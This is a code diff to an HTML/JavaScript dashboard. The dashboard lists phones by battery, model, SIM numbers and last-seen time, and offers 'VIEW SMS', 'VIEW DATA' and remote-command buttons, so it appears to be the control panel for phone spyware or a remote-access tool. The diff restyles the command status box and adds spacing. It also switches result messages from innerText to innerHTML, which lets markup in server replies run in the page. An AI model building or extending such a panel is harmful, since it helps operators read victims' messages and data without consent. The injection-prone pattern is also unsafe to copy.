@@ -65,7 +65,7 @@
         .data-table th, .data-table td { text-align: left; padding: 12px; border-bottom: 1px solid #eee; }
         .data-table th { background: #f8fafc; color: #555; font-size: 13px; width: 40%; }
         .data-table td { color: #333; font-size: 14px; }
-        .cmd-status-box { margin-top: 10px; padding: 10px; border-radius: 8px; font-weight: bold; font-size: 13px; display: none; text-align: center; }
+        .cmd-status-box { margin-top: 10px; padding: 15px; border-radius: 10px; font-weight: bold; font-size: 14px; display: none; text-align: center; border: 1px solid #ddd; }
     </style>
 </head>
 <body>
@@ -186,11 +186,11 @@
                 if (data.success) {
                     statusBox.style.background = '#e8f5e9';
                     statusBox.style.color = '#2e7d32';
-                    statusBox.innerText = "✅ " + (data.message || "Action Successful");
+                    statusBox.innerHTML = `✅ <b>Result:</b><br>${data.message || "Command Successful"}`;
                 } else {
                     statusBox.style.background = '#ffebee';
                     statusBox.style.color = '#c62828';
-                    statusBox.innerText = "❌ " + (data.message || "Action Failed");
+                    statusBox.innerHTML = `❌ <b>Failed:</b><br>${data.message || "Command Failed"}`;
                 }
             }
             toast(data.message || (data.success ? 'Success' : 'Failed'), !data.success);
@@ -239,9 +239,11 @@
                         <span style="font-weight:bold;">${d.battery||0}%</span>
                     </div>
                     <div class="serial-badge">#${idx + 1}<br><small>${d.model || 'Unknown'}</small><br>${statusBadge}</div>
+                    
                     <div class="info" style="margin-top: 25px;"><b>SIM1:</b> <span>${d.sim1 || 'N/A'} <i class="fas fa-copy" onclick="copyText('${d.sim1}')"></i></span></div>
                     <div class="info"><b>SIM2:</b> <span>${d.sim2 || 'N/A'} <i class="fas fa-copy" onclick="copyText('${d.sim2}')"></i></span></div>
                     <div class="info"><b>Last Seen:</b> <span>${formatLastSeen(d.lastSeen)}</span></div>
+                    
                     <div class="btns">
                         <button class="btn-sm btn-view" onclick="viewData('${id}')">VIEW DATA</button>
                         <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewSms('${id}')">VIEW SMS</button>
